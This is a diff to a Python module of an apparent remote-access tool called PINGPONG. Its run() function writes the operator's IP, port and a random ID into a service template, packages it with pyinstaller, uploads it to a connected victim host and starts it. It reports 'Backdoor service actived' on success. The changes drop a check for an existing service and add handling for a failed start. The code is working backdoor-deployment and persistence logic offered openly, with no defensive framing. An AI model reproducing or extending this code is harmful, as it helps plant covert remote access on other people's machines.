@@ -10,6 +10,7 @@ import PINGPONG_script.addsend as app_send
 from os import mkdir, system, remove
 from shutil import rmtree, copyfile
 from os.path import exists, getsize, exists
+from random import randint
 def clear_pyinstaller_tmp(name, copytodir):
     rmtree('./build')
     remove(f'./{name}.spec')
@@ -25,12 +26,6 @@ def generate_random_str(randomlength=16):
 def run(conn, addr, my_addr):
     if app_send.App_send('PERS_APP', True, conn, addr, my_addr):
         pingpong_dir = conn.recv(1024).decode('utf8')
-        if pingpong_dir == 'HAVEIT':
-            print_warn('PINGPONG>[!]The host already has Pingpong service')
-            print_normal('PINGPONG>[*]Remove it......')
-            conn.recv(1024)
-            conn.send(b'OK')
-            print_normal('PINGPONG>[*]Done')
         if exists('./PINGPONG_script/basic_command/TEMP'):
             rmtree('./PINGPONG_script/basic_command/TEMP')
         mkdir('./PINGPONG_script/basic_command/TEMP')
@@ -44,8 +39,7 @@ def run(conn, addr, my_addr):
                 count += 1
                 if '#WRITE_IN_LINE_FOR_IP_AND_PORT' in line:
                     write_line = count
-            lines.insert(write_line, f'        self.ip, self.port = "{my_addr[0]}", {my_addr[1]}')
-            lines.insert(write_line+1, f'       _id = "{generate_random_str()}"')
+            lines.insert(write_line, f'        self.ip, self.port = "{my_addr[0]}", {my_addr[1]}\n        self._id = "{generate_random_str()}"')
         
         pay_line = ''.join(lines)
         with open('./PINGPONG_script/basic_command/TEMP/pingpong_service.py', 'w+') as pay:
@@ -78,9 +72,13 @@ def run(conn, addr, my_addr):
             conn.recv(1024)
             print_normal('PINGPONG>[*]Upload done')
             print_normal('PINGPONG>[*]Starting service')
-            conn.recv(1024)
-            print_normal('PINGPONG>[*]Done')
-            print_good(f'PINGPONG>[+]Backdoor service actived in {my_addr[0]}:{my_addr[1]} >>> {addr[0]}:{addr[1]}')
+            check = conn.recv(1024).decode('utf8')
+            if check == 'OK':
+                print_normal('PINGPONG>[*]Done')
+                print_good(f'PINGPONG>[+]Backdoor service actived in {my_addr[0]}:{my_addr[1]} >>> {addr[0]}:{addr[1]}')
+            elif check == 'NONE':
+                print_error('PINGPONG>[-]Failed to start, Maybe the permissions are too low')
+                print_normal(f'PINGPONG>[*]The service file is in {pingpong_dir}\\pingpong_service.exe')
             return True
 def init_is_open():
     return True
